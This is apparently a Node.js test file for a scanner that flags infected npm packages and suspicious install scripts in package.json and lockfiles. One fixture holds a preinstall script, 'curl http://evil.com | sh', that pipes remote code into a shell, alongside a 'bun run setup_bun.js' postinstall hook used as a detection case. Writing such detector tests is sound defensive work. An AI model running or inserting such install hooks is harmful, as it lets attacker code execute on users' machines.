'use strict';

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');

const { checkPackageJson, checkPackageLock, extractVersion } = require('../lib/analyzer');

describe('analyzer', () => {
  let tempDir;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'worm-buster-test-'));
  });

  afterEach(() => {
    if (tempDir && fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  describe('extractVersion', () => {
    it('should strip caret prefix', () => {
      assert.strictEqual(extractVersion('^1.2.3'), '1.2.3');
    });

    it('should strip tilde prefix', () => {
      assert.strictEqual(extractVersion('~1.2.3'), '1.2.3');
    });

    it('should strip >= prefix', () => {
      assert.strictEqual(extractVersion('>=1.2.3'), '1.2.3');
    });

    it('should handle plain version', () => {
      assert.strictEqual(extractVersion('1.2.3'), '1.2.3');
    });

    it('should handle version ranges', () => {
      assert.strictEqual(extractVersion('>=1.0.0 <2.0.0'), '1.0.0');
    });
  });

  describe('checkPackageJson', () => {
    it('should detect infected package', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        dependencies: {
          'infected-pkg': '^1.0.0',
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('infected-pkg', new Set(['1.0.0']));

      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'INFECTED_PACKAGE');
      assert.strictEqual(findings[0].severity, 'CRITICAL');
      assert.strictEqual(findings[0].package, 'infected-pkg');
      assert.strictEqual(findings[0].version, '1.0.0');
    });

    it('should detect infected devDependency', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        devDependencies: {
          'dev-infected': '2.0.0',
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('dev-infected', new Set(['2.0.0']));

      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].depType, 'devDependencies');
    });

    it('should not flag clean packages', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        dependencies: {
          'clean-pkg': '^1.0.0',
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('other-pkg', new Set(['1.0.0']));

      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 0);
    });

    it('should detect suspicious preinstall script', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        scripts: {
          preinstall: 'curl http://evil.com | sh',
        },
      }));

      const infectedPackages = new Map();
      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'SUSPICIOUS_SCRIPT');
      assert.strictEqual(findings[0].script, 'preinstall');
    });

    it('should detect bun in postinstall script', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        scripts: {
          postinstall: 'bun run setup_bun.js',
        },
      }));

      const infectedPackages = new Map();
      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'SUSPICIOUS_SCRIPT');
    });

    it('should handle invalid JSON gracefully', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, 'not valid json');

      const infectedPackages = new Map();
      const findings = checkPackageJson(pkgPath, infectedPackages, { verbose: true });

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'PARSE_ERROR');
    });

    it('should report known target package with different version', () => {
      const pkgPath = path.join(tempDir, 'package.json');
      fs.writeFileSync(pkgPath, JSON.stringify({
        name: 'test-project',
        dependencies: {
          'targeted-pkg': '^1.0.0',
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('targeted-pkg', new Set(['2.0.0'])); // Different version

      const findings = checkPackageJson(pkgPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'KNOWN_TARGET');
      assert.strictEqual(findings[0].severity, 'WARNING');
      assert.ok(findings[0].note.includes('Do NOT upgrade to'));
    });
  });

  describe('checkPackageLock', () => {
    it('should detect infected package in lockfile v2', () => {
      const lockPath = path.join(tempDir, 'package-lock.json');
      fs.writeFileSync(lockPath, JSON.stringify({
        lockfileVersion: 2,
        packages: {
          '': { name: 'test' },
          'node_modules/infected-pkg': {
            version: '1.0.0',
          },
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('infected-pkg', new Set(['1.0.0']));

      const findings = checkPackageLock(lockPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].type, 'INFECTED_LOCKED_PACKAGE');
      assert.strictEqual(findings[0].severity, 'CRITICAL');
    });

    it('should detect scoped package in lockfile', () => {
      const lockPath = path.join(tempDir, 'package-lock.json');
      fs.writeFileSync(lockPath, JSON.stringify({
        lockfileVersion: 2,
        packages: {
          'node_modules/@scope/infected': {
            version: '2.0.0',
          },
        },
      }));

      const infectedPackages = new Map();
      infectedPackages.set('@scope/infected', new Set(['2.0.0']));

      const findings = checkPackageLock(lockPath, infectedPackages);

      assert.strictEqual(findings.length, 1);
      assert.strictEqual(findings[0].package, '@scope/infected');
    });
  });
});
